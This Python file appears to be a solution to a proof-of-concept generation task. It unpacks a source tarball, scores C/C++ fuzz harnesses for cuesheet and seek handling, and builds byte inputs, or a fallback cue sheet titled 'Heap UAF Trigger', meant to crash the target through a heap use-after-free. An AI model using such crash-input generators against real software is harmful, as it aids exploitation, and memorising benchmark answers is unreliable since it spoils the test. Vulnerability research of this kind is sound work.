import os
import tarfile
import tempfile
import re


class Solution:
    def _safe_extract(self, tar, path):
        base = os.path.realpath(path)
        for member in tar.getmembers():
            member_path = os.path.realpath(os.path.join(path, member.name))
            if not member_path.startswith(base + os.sep) and member_path != base:
                continue
            tar.extract(member, path)

    def _find_harness_text(self, root_dir):
        harness_candidates = []
        for root, _, files in os.walk(root_dir):
            for name in files:
                if not name.endswith((".c", ".cc", ".cpp", ".cxx", ".C", ".CPP")):
                    continue
                path = os.path.join(root, name)
                try:
                    with open(path, "r", errors="ignore") as f:
                        text = f.read()
                except Exception:
                    continue
                lower = text.lower()
                score = 0
                if "llvmfuzzertestoneinput" in lower:
                    score += 10
                if "fuzz" in lower:
                    score += 3
                if "cuesheet" in lower:
                    score += 5
                if "seek" in lower:
                    score += 2
                if score > 0:
                    harness_candidates.append((score, path, text))
        if not harness_candidates:
            return None
        harness_candidates.sort(key=lambda x: -x[0])
        return harness_candidates[0][2]

    def _extract_switch_body(self, text, start_index):
        brace_index = text.find("{", start_index)
        if brace_index == -1:
            return ""
        depth = 1
        i = brace_index + 1
        n = len(text)
        while i < n and depth > 0:
            ch = text[i]
            if ch == "{":
                depth += 1
            elif ch == "}":
                depth -= 1
            i += 1
        if depth != 0:
            return ""
        return text[brace_index + 1 : i - 1]

    def _find_ops_in_text(self, text):
        # Try to locate a switch that dispatches on operations derived from data bytes.
        for sw in re.finditer(r"switch\s*\(\s*([^\)]+)\)", text):
            switch_expr = sw.group(1).strip()
            body = self._extract_switch_body(text, sw.end())
            if not body:
                continue

            mod = None

            # Case 1: switch(data[idx] % N)
            m_direct = re.search(
                r"(?:data|Data)\s*\[\s*([^\]]+)\s*\]\s*%\s*(\d+)", switch_expr
            )
            if m_direct:
                try:
                    mod = int(m_direct.group(2))
                except Exception:
                    mod = None
            else:
                # Case 2: switch(var); var = data[idx] % N;
                varname_match = re.match(r"([A-Za-z_][A-Za-z0-9_]*)$", switch_expr)
                if varname_match:
                    varname = varname_match.group(1)
                    pre_region = text[max(0, sw.start() - 500) : sw.start()]
                    assign_re = re.compile(
                        r"%s\s*=\s*([^;]+);" % re.escape(varname)
                    )
                    for am in assign_re.finditer(pre_region):
                        rhs = am.group(1)
                        mm = re.search(
                            r"(?:data|Data)\s*\[\s*([^\]]+)\s*\]\s*%\s*(\d+)", rhs
                        )
                        if mm:
                            try:
                                mod = int(mm.group(2))
                            except Exception:
                                mod = None
                            break

            if not mod or mod <= 0:
                continue

            # Parse cases to find cuesheet and seek-related operations.
            cases = list(re.finditer(r"case\s+(\d+)\s*:", body))
            if not cases:
                continue

            import_case = None
            append_case = None

            for i, cm in enumerate(cases):
                try:
                    val = int(cm.group(1))
                except Exception:
                    continue
                block_start = cm.end()
                block_end = cases[i + 1].start() if i + 1 < len(cases) else len(body)
                blk = body[block_start:block_end].lower()
                if import_case is None and "cuesheet" in blk:
                    import_case = val
                if append_case is None and ("seek" in blk or "seekpoint" in blk):
                    append_case = val

            if import_case is not None and append_case is not None:
                return mod, append_case, import_case

        return None

    def _build_poc_from_harness(self, text):
        # Determine minimal size requirement from conditions like "if (Size < N)".
        size_thresholds = []
        for m in re.finditer(r"\bSize\s*<\s*(\d+)", text):
            try:
                size_thresholds.append(int(m.group(1)))
            except Exception:
                pass
        for m in re.finditer(r"\bSize\s*<=\s*(\d+)", text):
            try:
                size_thresholds.append(int(m.group(1)) - 1)
            except Exception:
                pass
        min_size = max(size_thresholds) + 1 if size_thresholds else 1

        # Find maximum constant index into data/Data array.
        index_consts = []
        for m in re.finditer(r"\b(?:data|Data)\s*\[\s*(\d+)\s*\]", text):
            try:
                index_consts.append(int(m.group(1)))
            except Exception:
                pass

        length = max(min_size, (max(index_consts) + 1) if index_consts else 1)
        # Ensure enough bytes for several operations
        if length < 32:
            length = 32

        poc = bytearray(length)
        # Default fill: small non-zero values to avoid edge cases like division by zero
        for i in range(length):
            poc[i] = 1

        ops_info = self._find_ops_in_text(text)
        if ops_info:
            mod, append_case, import_case = ops_info
            # Values that will select given cases via "byte % mod"
            append_val = append_case % 256
            import_val = import_case % 256
            # Avoid 0 if possible, just in case 0 has special meaning elsewhere
            if append_val == 0 and mod > 1:
                append_val = (append_val + mod) % 256
            if import_val == 0 and mod > 1:
                import_val = (import_val + mod) % 256

            # Fill the entire buffer with alternating append/import pattern
            pattern = [append_val, import_val]
            for i in range(length):
                poc[i] = pattern[i % len(pattern)]

        return bytes(poc)

    def _generic_cuesheet(self):
        # Fallback textual cuesheet; moderately small but exercises tracks and indices.
        lines = [
            'REM GENRE "Test"',
            "REM DATE 2025",
            'PERFORMER "PoCTest"',
            'TITLE "Heap UAF Trigger"',
            'FILE "test.flac" WAVE',
        ]
        # A handful of tracks with multiple indices to exercise cuesheet/seekpoint paths
        for t in range(1, 8):
            lines.append("  TRACK %02d AUDIO" % t)
            # Two indices per track (00 and 01)
            minute = (t - 1) // 2
            second = ((t - 1) * 10) % 60
            lines.append("    INDEX 00 %02d:%02d:%02d" % (minute, second, 0))
            lines.append("    INDEX 01 %02d:%02d:%02d" % (minute, (second + 2) % 60, 0))
        data = "\n".join(lines) + "\n"
        return data.encode("ascii", errors="ignore")

    def solve(self, src_path: str) -> bytes:
        tmpdir = tempfile.mkdtemp(prefix="poc61292_")
        try:
            with tarfile.open(src_path, "r:*") as tar:
                self._safe_extract(tar, tmpdir)
        except Exception:
            # If extraction fails, just return a generic cuesheet
            return self._generic_cuesheet()

        harness_text = self._find_harness_text(tmpdir)
        if harness_text:
            try:
                return self._build_poc_from_harness(harness_text)
            except Exception:
                return self._generic_cuesheet()
        else:
            return self._generic_cuesheet()